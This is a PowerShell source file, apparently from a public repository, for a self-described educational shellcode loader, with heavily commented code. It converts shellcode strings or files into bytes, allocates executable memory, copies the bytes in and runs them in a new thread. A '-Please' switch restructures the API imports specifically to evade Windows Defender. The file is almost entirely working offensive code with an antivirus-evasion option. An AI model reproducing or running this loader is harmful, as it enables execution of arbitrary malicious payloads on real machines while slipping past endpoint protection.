function Load-Shellcode {
#.SYNOPSIS
# Educational PowerShell-based Shellcode Loader
# Arbitary Version Number: v1.0.1
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Predominantly educational shellcode loader with overly verbose comments.  The idea is to be fairly
# modular, and documented to be an educational resource for those getting into exploit development.
# 
# Currently, only standard execution via CreateThread() is supported -- eventually will implement
# remote process injection and other techniques.  EDR evasion is effectively non-existent, though
# the `-Please` parameter is goofy enough to bypass Windows Defender.
#
# Works with both Windows PowerShell and PowerShell Core (Pwsh), as well as 64-bit and 32-bit
# architectures -- just make sure you are running 32-bit PowerShell if your shellcode is 32-bit.
#
# As for shellcode, the `-Shellcode` parameter is intenionally undeclared and written to accept most 
# shellcode formats.  Currently supports strings [string] and byte arrays [byte[]].
#
# Supported String Formats:
#   > Path to Raw Shellcode   : .\shellcode.bin
#   > Python Shellcode Format : 'b"\x45\x78\x61\x6d\x70\x6c\x65"'
#   > C Shellcode Format      : '\x45\x78\x61\x6d\x70\x6c\x65'
#   > C++/C# Shellcode Format : '{0x45,0x78,0x61,0x70,0x6c,0x65}'
#
# Parameters:
#   -Shellcode  -->  Shellcode to execute; can be a byte array or string containing file path or bytes.
#   -Please     -->  Alternative execution method that will likely bypass Windows Defender.
#   -Help       -->  Return Get-Help information.
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS

    Param(
        $Shellcode, # Intentionally vague type for maximum compatibility
        [switch]$Please,
        [switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help Load-Shellcode) }


    # Error Correction
    if (!$Shellcode) { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }


    # Print data type
    Write-Host "[!] Detecting Data Type of Shellcode Parameter:" -ForegroundColor Yellow
    Write-Host " o  BaseType : $($Shellcode.GetType().BaseType)"
    Write-Host " o  Name     : $($Shellcode.GetType().Name)"

    
    # Supported String Formats:
    #   > Paths to raw files (e.g., ".\shellcode.bin")
    #   > Python : 'b"\x45\x78\x61\x6d\x70\x6c\x65"'
    #   > C      : '\x45\x78\x61\x6d\x70\x6c\x65'
    #   > C++/C# : '{0x45,0x78,0x61,0x70,0x6c,0x65}'

    if ($Shellcode -is [String]) {
        
        $Shellcode = $Shellcode.Replace("`n",'')
       
        # Check if $Shellcode is a path to a shellcode file
        if (Test-Path -LiteralPath $Shellcode) {
            
            Write-Host " o  Parameter is a path to a file."
            $ShellcodePath = (Get-Item -LiteralPath $Shellcode).Fullname    
            $psByteArray = [System.IO.File]::ReadAllBytes($ShellcodePath)
            Write-Host " o  --> Path : $ShellcodePath"
        }

        # Format C/Python formatted shellcode string into PowerShell format
        elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {

            Write-Host " o  Shellcode formatted for C or Python."
            Write-Host " o  --> Formatting for PowerShell..."

            # Convert to PowerShell ASCII array
            $Shellcode = $Shellcode.Replace(' ','')
            $psShellcode = (($Shellcode.Replace('b"','').Replace('"','')).Split('\'))[1..$Shellcode.Length]

            # Convert Shellcode ASCII array to Byte Array
            $psByteArray = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
        }

        # Format C++/C# formatted shellcode string into PowerShell format
        elseif ($Shellcode -like '{0x*') {

            Write-Host " o  Shellcode formatted for C++ or C#."
            Write-Host " o  --> Formatting for PowerShell..."

            # Convert to PowerShell ASCII array
            $Shellcode = $Shellcode.Replace(' ','')
            $psShellcode = (($Shellcode.Replace('{0x','').Replace('}','')).Split(',0x')) | % { if ($_ -ne "") { $_ } }

            # Convert Shellcode ASCII array to Byte Array
            $psByteArray = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
        }
        else { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
    }
    
    # Shellcode is already formatted as a byte array
    elseif ($Shellcode -is [Byte[]]) {

        Write-Host " o  Shellcode already formatted as a byte array."
        Write-Host " o  --> No formatting required."
        $psByteArray = $Shellcode
    }
    else { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
    

    # Load Win32 API Calls required for Execution
    Write-Host "[!] Loading Win32 API Calls..." -ForegroundColor Yellow -NoNewline

    Try {

        # Method 1: classic verbose method, but this will get blocked by Windows Defender
        if (!$Please) {
            $Win32Api = @'
using System;
using System.Runtime.InteropServices;

// Main Win32 API calls needed for shellcode execution
public class Win32 {
    [DllImport("Kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")]
    public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);

    [DllImport("Kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("Kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);
}
'@
            Add-Type -TypeDefinition $Win32Api -PassThru
        }
        
        # Method 2: this goofy method doesn't get caught by defender, but is very noisy
        else {
            Add-Type -Namespace Var1 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);'
            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);'
            Add-Type -Namespace Var3 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);'
            Add-Type -Namespace Var4 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);'
        }
    }

    Catch { return (Write-Host "`n[!] Error! Failed to load API calls.`n o  (Note: This likely failed due to Windows Defender.)" -ForegroundColor Red) }


    ### Allocate executable memory for shellcode

    # VirtualAlloc()
    #
    #    Definition  >  Allocates space in memory and returns a pointer to allocated space.
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    #
    #  ----------          ------      ------------
    #   Argument            Type        Definition
    #  ----------          ------      ------------
    #  > lpAddress         > [IntPtr]  > starting address in memory to allocate (if null, system dynamiclly determines where this is)
    #  > dwSize            > [Int]     > size of memory to allocate             (i.e., size of shellcode)
    #  > flAllocationType  > [Int]     > memory allocation flags                (i.e., MEM_COMMIT and MEM_RESERVE flags)
    #  > flProtect         > [Int]     > memory protection flags                (i.e., PAGE_EXECUTE_READWRITE flag)


    Write-Host "[!] Allocating executable memory for shellcode..." -ForegroundColor Yellow

    $memCommit            = 0x1000
    $memReserve           = 0x2000
    $pageExecuteReadWrite = 0x40
    $shellSize            = $psByteArray.Length

    Try {
        if (!$Please) { $shellAddr = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellSize, $memCommit -bor $memReserve, $pageExecuteReadWrite)    }
        else          { $shellAddr = [Var1.Api]::VirtualAlloc([IntPtr]::Zero, $shellSize, $memCommit -bor $memReserve, $pageExecuteReadWrite) }
    }
    Catch { return (Write-Host '[!] Error! Failed to allocate memory.' -ForegroundColor Red) }

    Write-Host " o  VirtualAlloc()"
    Write-Host " o  --> Allocated Memory Address : $shellAddr"
    Write-Host " o  --> Memory Block Size        : $shellSize bytes"


    ### Copy shellcode into allocated memory

    # MoveMemory()
    #
    #    Definition  >  Moves a block of memory from one location to another.
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366535(v=vs.85)
    #    Reference   >  https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366788(v=vs.85)
    #
    #  ----------          ------      ------------
    #   Argument            Type        Definition
    #  ----------          ------      ------------
    #  > Destination       > [IntPtr]  > destination address in memory to copy to (i.e., executable memory address pointer)
    #  > Source            > [IntPtr]  > source address of block to copy from     (i.e., address pointer containing the shellcode byte array)
    #  > Length            > [Int]     > size of the memory block to copy         (i.e., length of the shellcode byte array)

    Write-Host "[!] Moving shellcode to allocated memory..." -ForegroundColor Yellow

    # Copy method via pinning memory address of shellcode byte array variable
    Try {
        $gch    = [Runtime.InteropServices.GCHandle]::Alloc($psByteArray, 'Pinned')
        $srcPtr = $gch.AddrOfPinnedObject()

        if (!$Please) { [Win32]::MoveMemory($shellAddr, $srcPtr, $shellSize)    }
        else          { [Var2.Api]::MoveMemory($shellAddr, $srcPtr, $shellSize) }

        $gch.free | Out-Null

        # Alternative copy method not requiring CopyMemory() -- generally a bit louder
        # [System.Runtime.InteropServices.Marshal]::Copy($psByteArray, 0, $shellAddr, $shellSize)
    }
    Catch { return (Write-Host '[!] Error! Failed to move memory block.' -ForegroundColor Red) }
    
    Write-Host " o  MoveMemory()"
    Write-host " o  --> Source Shellcode Variable Address (non-executable) : $srcPtr"
    Write-Host " o  --> Destination Memory Address (executable)            : $shellAddr"
    Write-host " o  --> Shellcode Size                                     : $shellSize bytes"


    ### Execute the shellcode

    # CreateThread()
    #
    #    Definition  >  Create a thread to execute within the address space of the calling process.
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    #
    #  ----------            ------      ------------
    #   Argument              Type        Definition
    #  ----------            ------      ------------
    #  > lpThreadAttributes  > [IntPtr]  > pointer to SECURITY_ATTRIBUTES struct                     (i.e., no pointer means handle cannot be inherited)
    #  > dwStackSize         > [Int]     > initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
    #  > lpStartAddress      > [IntPtr]  > pointer to the memory address to be executed              (i.e., executable shellcode memory address)
    #  > lpParameter         > [IntPtr]  > pointer to a variable to be passed to the thread          (i.e., 0 means none)
    #  > dwCreationFlags     > [Int]     > creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
    #  > lpThreadId          > [IntPtr]  > pointer to a variable that receives the thread identifier (i.e., null means nothing is returned)

    Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow

    $threadId = 0

    Try {
        if (!$Please) { $thread = [Win32]::CreateThread([IntPtr]::Zero, 0, $shellAddr, [IntPtr]::Zero, 0, [ref]$threadId)    }
        else          { $thread = [Var3.Api]::CreateThread([IntPtr]::Zero, 0, $shellAddr, [IntPtr]::Zero, 0, [ref]$threadId) }
    }
    Catch { return (Write-Host '[!] Error! Failed to create thread.' -ForegroundColor Red)                    }
    
    Write-Host " o  CreateThread()"
    Write-Host " o  -->  ID : $thread"


    ### Wait for the thread to finish

    # WaitForSingleObject()
    #
    #    Definition  >  Wait until an specified object returns a signal (or until a timeout elapses).
    #    Location    >  Kernel32.dll
    #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    #
    #  ----------        ------      ------------
    #   Argument          Type        Definition
    #  ----------        ------      ------------
    #  > hHandle         > [IntPtr]  > handle to the target object                 (i.e., handle to executed shellcode)
    #  > dwMilliseconds  > [Int]     > time-out interval to wait for object signal (i.e., -1 will wait indefinitely until the object signals)

    Write-Host "[!] Waiting for thread to finish..." -ForegroundColor Yellow

    if (!$Please) { [Win32]::WaitForSingleObject($thread, 0xFFFFFFFF)    }
    else          { [Var4.Api]::WaitForSingleObject($thread, 0xFFFFFFFF) }

    Write-Host " o  Done."
}
